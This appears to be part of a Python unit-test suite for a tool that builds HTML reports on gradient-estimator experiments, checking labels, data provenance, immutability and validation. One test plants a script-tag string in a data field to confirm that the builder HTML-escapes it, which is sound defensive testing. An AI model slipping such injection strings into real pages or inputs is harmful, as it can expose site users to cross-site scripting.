            "Score estimator identity",
            "Pathwise estimator target",
            "Finite-difference target",
            "Soft surrogate",
            "Straight-through construction",
            "Residual control-variate identity",
        ):
            with self.subTest(label=label):
                self.assertIn(f'aria-label="{label}"', page)
        self.assertIn("∇E[H] = E[∇S] + E[(H−S)u / σ]", page)
        self.assertIn("Exactness", page)
        self.assertIn("Bias", page)
        self.assertIn("Variance", page)
        self.assertIn("DGO backend estimates jump contributions", page)

    def test_report_renders_complete_evidence_and_reproducibility_fields(self):
        builder = self._builder()
        page = builder.render_report(
            root=make_valid_fixture(self), template_path=REPORT_TEMPLATE
        ).decode("utf-8")

        for label in (
            "Mean gradient",
            "Empirical bias",
            "Empirical variance",
            "Mean squared error",
            "CI low",
            "CI high",
            "Tracemalloc peak",
            "RSS delta",
            "Warp allocation peak",
            "Device free-memory delta",
            "Manifest schema",
            "Summary schema",
            "Report tier",
            "Artifact digests",
            "optimization schedules",
            "estimator seeds",
            "https://github.com/NVIDIA/warp",
        ):
            with self.subTest(label=label):
                self.assertIn(label, page)

    def test_typed_model_exposes_immutable_publication_contract(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        model = builder.load_report(root)

        decision = model.manifest.report_reference_count_decision
        self.assertEqual(decision.status, "accepted")
        self.assertEqual(
            decision.protocol_fingerprint,
            REAL_V2_REPORT_REFERENCE_COUNT_DECISION["protocol_fingerprint"],
        )
        self.assertEqual(decision.path_reference_samples, 32768)
        self.assertEqual(decision.contact_reference_samples, 65536)

        runtime = model.summary.runtime
        self.assertEqual(
            runtime.elapsed_measurement,
            "through_one_complete_descriptor_relative_install_pass",
        )
        self.assertIn("installation", runtime.phase_seconds)
        self.assertEqual(len(runtime.measurement_excludes), 2)

        contract = model.path_smoothing_contract
        self.assertTrue(contract.complete)
        self.assertFalse(contract.fully_smoothed)
        self.assertEqual(
            (
                contract.transformed_sites,
                contract.smoothed_sites,
                contract.numerical_gauge_sites,
            ),
            (7, 2, 5),
        )
        self.assertEqual(contract.fingerprint, PATH_CERTIFICATE_FINGERPRINT)
        self.assertEqual(contract.target, PATH_GAUGE_TARGET)
        self.assertTrue(contract.numerical_gauge_assumption)

        contact_rows = [
            row
            for row in model.optimization_rows
            if row.source_file == "data/raw/contact_3d_optimization.json"
        ]
        self.assertEqual(len(contact_rows), 48)
        self.assertEqual(
            {
                row.method: sum(item.method == row.method for item in contact_rows)
                for row in contact_rows
            },
            {
                "residual_control_variate": 16,
                "soft_ad": 16,
                "straight_through_ad": 16,
            },
        )
        self.assertTrue(all(row.physical_valid for row in contact_rows))
        self.assertTrue(
            all(row.hard_evaluation_forward_executions == 387 for row in contact_rows)
        )

        reference = model.reference_rows[0]
        self.assertEqual(reference.reference_gradient, (0.0, 0.0))
        self.assertEqual(reference.richardson_ci_low, (0.0, 0.0))
        self.assertEqual(reference.richardson_ci_high, (0.0, 0.0))
        self.assertEqual(reference.fine_truncation_error_mean, (0.0, 0.0))
        self.assertEqual(reference.truncation_upper_bound, (0.0, 0.0))
        self.assertEqual(reference.truncation_statistical_budget, (0.0, 0.0))
        self.assertGreater(reference.truncation_roundoff_floor[0], 0.0)
        self.assertEqual(
            reference.truncation_effective_budget,
            reference.truncation_roundoff_floor,
        )
        self.assertEqual(reference.truncation_floor_dominated, (True, True))
        self.assertEqual(reference.truncation_components, (True, True))
        self.assertEqual(reference.overlap_components, (True, True))
        self.assertEqual(reference.marginal_step_components, (True, True))
        self.assertEqual(reference.paired_step_components, (True, True))
        self.assertEqual(dict(reference.truncation_policy), REFERENCE_TRUNCATION_POLICY)
        raw_reference = json.loads(
            (root / reference.source_file).read_text(encoding="utf-8")
        )["rows"][reference.source_index]
        self.assertEqual(reference.h, tuple(raw_reference["h"]))
        self.assertEqual(reference.h_half, tuple(raw_reference["h_half"]))
        self.assertEqual(reference.samples, raw_reference["counts"]["samples"])
        self.assertEqual(reference.replicates, raw_reference["counts"]["replicates"])
        self.assertEqual(
            reference.h_forward_executions,
            raw_reference["counts"]["h_forward_executions"],
        )
        self.assertEqual(
            reference.h2_forward_executions,
            raw_reference["counts"]["h2_forward_executions"],
        )
        self.assertEqual(
            reference.five_point_forward_executions,
            raw_reference["counts"]["five_point_forward_executions"],
        )
        self.assertEqual(
            reference.score_forward_executions,
            raw_reference["counts"]["score_forward_executions"],
        )
        self.assertEqual(
            reference.forward_executions,
            raw_reference["counts"]["forward_executions"],
        )
        self.assertEqual(
            dict(reference.seeds),
            {name: tuple(stream) for name, stream in raw_reference["seeds"].items()},
        )

        gradient = model.gradient_rows[0]
        self.assertEqual(gradient.relative_error, gradient.raw["relative_error"])
        self.assertEqual(gradient.cosine_similarity, gradient.raw["cosine_similarity"])
        self.assertEqual(gradient.sign_agreement, gradient.raw["sign_agreement"])

        with self.assertRaises(dataclasses.FrozenInstanceError):
            decision.status = "changed"
        with self.assertRaises(TypeError):
            runtime.phase_seconds["installation"] = 0.0

    def test_report_renders_decision_gauge_contact_and_installed_runtime(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        page = builder.render_report(root=root, template_path=REPORT_TEMPLATE).decode(
            "utf-8"
        )
        parser = _RenderedPageParser()
        parser.feed(page)

        self.assertIn("Accepted report reference-count decision", page)
        self.assertIn("Path smoothing certificate and numerical gauge", page)
        self.assertIn("Contact optimization physical rechecks", page)
        self.assertIn("Installed report runtime", page)
        self.assertIn("fully smoothed", page.casefold())
        self.assertIn("almost everywhere", page.casefold())
        self.assertIn("not fully smoothed", page.casefold())

    def test_report_renders_reference_step_seed_and_execution_provenance(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        page = builder.render_report(root=root, template_path=REPORT_TEMPLATE).decode(
            "utf-8"
        )
        parser = _RenderedPageParser()
        parser.feed(page)

        self.assertIn("Reference execution and seed provenance", page)
        for heading in (
            "h",
            "h/2",
            "h forward executions",
            "h/2 forward executions",
            "Five-point forward executions",
            "Score forward executions",
            "Total forward executions",
            "Five-point outer seeds",
            "Five-point inner seeds",
            "Score outer seeds",
            "Score inner seeds",
        ):
            with self.subTest(heading=heading):
                self.assertIn(heading, page)

        source_keys = {
            attributes.get("data-source-key") for attributes, _text in parser.cells
        }
        for index in range(len(EXPECTED_REFERENCE_CELLS)):
            prefix = f"/rows/{index}"
            for suffix in (
                "/h",
                "/h_half",
                "/counts/h_forward_executions",
                "/counts/h2_forward_executions",
                "/counts/five_point_forward_executions",
                "/counts/score_forward_executions",
                "/counts/forward_executions",
                "/seeds/five_point_outer",
                "/seeds/five_point_inner",
                "/seeds/score_outer",
                "/seeds/score_inner",
            ):
                with self.subTest(index=index, suffix=suffix):
                    self.assertIn(f"#{quote(prefix + suffix, safe='')}", source_keys)
        self.assertIn(REAL_V2_REPORT_REFERENCE_COUNT_RATIONALE, page)
        self.assertIn(PATH_CERTIFICATE_FINGERPRINT, page)
        self.assertIn(PATH_GAUGE_TARGET, page)
        self.assertIn(PATH_GAUGE_TARGET_LABEL, page)
        self.assertIn("through_one_complete_descriptor_relative_install_pass", page)
        self.assertIn("final_metadata_bearing_reinstall_and_binding_verification", page)
        self.assertIn("Accepted Richardson reference gradients", page)
        self.assertIn("Reference truncation policy", page)
        self.assertIn("Fine truncation mean", page)
        self.assertIn("Overlap components", page)
        self.assertIn("Paired step components (audit only)", page)
        self.assertIn("fine-step truncation", page.casefold())
        self.assertIn("componentwise, not simultaneous", page.casefold())
        self.assertIn("audit-only", page.casefold())
        self.assertIn("do not gate publication", page.casefold())
        self.assertNotIn("paired-zero publication gate", page.casefold())

        sourced_cells = [
            (
                attributes.get("data-source-file"),
                unquote(attributes.get("data-source-key", "")),
                text,
            )
            for attributes, text in parser.cells
            if attributes.get("data-source-file") is not None
        ]
        self.assertTrue(
            any(cell[2] == PATH_ONB_SEAM_SEMANTICS for cell in sourced_cells)
        )
        self.assertIn(
            (
                "data/manifest.json",
                "#/report_reference_count_decision/status",
                "accepted",
            ),
            sourced_cells,
        )
        self.assertIn(
            (
                "data/summary.json",
                "#/runtime/elapsed_measurement",
                "through_one_complete_descriptor_relative_install_pass",
            ),
            sourced_cells,
        )
        contact_schedule_cells = [
            cell
            for cell in sourced_cells
            if cell[0] == "data/raw/contact_3d_optimization.json"
            and cell[1].endswith("/schedule_id")
        ]
        physical_valid_cells = [
            cell
            for cell in sourced_cells
            if cell[0] == "data/raw/contact_3d_optimization.json"
            and cell[1].endswith("/final_physical_validity/valid")
        ]
        self.assertEqual(len(contact_schedule_cells), 48)
        self.assertEqual(len(physical_valid_cells), 48)
        self.assertEqual(
            sorted(int(cell[2]) for cell in contact_schedule_cells),
            sorted(list(range(16)) * 3),
        )
        self.assertTrue(all(cell[2] == "true" for cell in physical_valid_cells))

    def test_residual_execution_table_does_not_truncate_rows(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        raw_path = root / "data/raw/analytic.json"
        raw = json.loads(raw_path.read_text(encoding="utf-8"))
        residual = next(
            row
            for row in raw["rows"]
            if row.get("method") == "residual_control_variate"
        )
        residual_rows = [residual]
        for index in range(1, 10):
            clone = dict(residual)
            clone["row_id"] = f"analytic:residual_control_variate:{index}"
            clone["outer_seed"] = index
            raw["rows"].append(clone)
            residual_rows.append(clone)
        write_fixture_json(raw_path, raw)

        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        residual_summary = next(
            row
            for row in summary["method_summaries"]
            if row["scenario"] == "analytic:step:analytic"
            and row["method"] == "residual_control_variate"
        )
        residual_summary["source_row_ids"] = [row["row_id"] for row in residual_rows]
        write_fixture_json(summary_path, summary)
        analytic_plot = root / "data/plot_data/analytic_gates.json"
        analytic_payload = json.loads(analytic_plot.read_text(encoding="utf-8"))
        analytic_payload["rows"][0]["source_row_ids"] = [
            row["row_id"] for row in raw["rows"]
        ]
        analytic_payload["rows"][0]["values"] = [
            row["gradient"][0]
            for row in raw["rows"]
            if row.get("method") in {"score", "soft_ad", "residual_control_variate"}
        ]
        write_fixture_json(analytic_plot, analytic_payload)
        bias_plot = root / "data/plot_data/bias_variance.json"
        bias_payload = json.loads(bias_plot.read_text(encoding="utf-8"))
        residual_plot = next(
            row
            for row in bias_payload["rows"]
            if row.get("scenario") == "analytic:step:analytic"
            and row.get("method") == "residual_control_variate"
        )
        residual_plot["source_row_ids"] = [row["row_id"] for row in residual_rows]
        write_fixture_json(bias_plot, bias_payload)
        _refresh_manifest(root)

        page = builder.render_report(root=root, template_path=REPORT_TEMPLATE).decode(
            "utf-8"
        )
        path_rows = json.loads(
            (root / "data/raw/path_tracer_gradients.json").read_text(encoding="utf-8")
        )["rows"]
        path_residual_count = sum(
            row.get("method") == "residual_control_variate" for row in path_rows
        )
        self.assertEqual(
            page.count("hard_forward_executions"),
            len(residual_rows) + path_residual_count + 1,
        )

    def test_corrupt_png_is_rejected_even_when_manifest_digest_matches(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        path = root / "assets/figures/analytic_gates.png"
        corrupted = bytearray(path.read_bytes())
        corrupted[corrupted.index(b"IDAT") + 4] ^= 1
        path.write_bytes(corrupted)
        _refresh_manifest(root)

        with self.assertRaisesRegex(builder.BuildError, "PNG|png|image"):
            builder.render_report(root=root, template_path=REPORT_TEMPLATE)

    def test_all_data_derived_strings_are_html_escaped(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        dangerous = '<script data-value="&">unsafe'
        summary["method_labels"]["score"] = dangerous
        write_fixture_json(summary_path, summary)
        _refresh_manifest(root)

        page = builder.render_report(root=root, template_path=REPORT_TEMPLATE).decode(
            "utf-8"
        )

        self.assertNotIn(dangerous, page)
        self.assertNotIn("<script", page.casefold())
        self.assertIn(
            "&lt;script data-value=&quot;&amp;&quot;&gt;unsafe",
            page,
        )

    def test_typed_model_and_aggregates_are_immutable_and_checked(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        model = builder.load_report(root)

        with self.assertRaises(dataclasses.FrozenInstanceError):
            model.manifest.tier = "changed"
        with self.assertRaises(TypeError):
            model.summary.method_labels["score"] = "changed"
        self.assertIsInstance(model.gradient_rows, tuple)
        path_score = next(
            aggregate
            for aggregate in model.gradient_aggregates
            if aggregate.scenario_family == "path_tracer"
            and aggregate.method == "score"
        )
        self.assertEqual(path_score.rows, 32)
        self.assertEqual(path_score.mean_wall_time, 0.01)
        self.assertEqual(path_score.wall_time_q25, 0.01)
        self.assertEqual(path_score.wall_time_q75, 0.01)
        with self.assertRaisesRegex(builder.BuildError, "finite|nonempty"):
            builder.checked_fmean(())
        with self.assertRaisesRegex(builder.BuildError, "quantile"):
            builder.checked_quantile((1.0,), 1.5)

    def test_generated_fixture_passes_publication_validator(self):
        builder = self._builder()
        root = make_valid_fixture(self)

        builder.build_report(
            root=root,
            output=root / "index.html",
            template_path=REPORT_TEMPLATE,
        )

        result = validate_publication(root)
        self.assertEqual(result["files"], 31)


if __name__ == "__main__":
    unittest.main(verbosity=2)
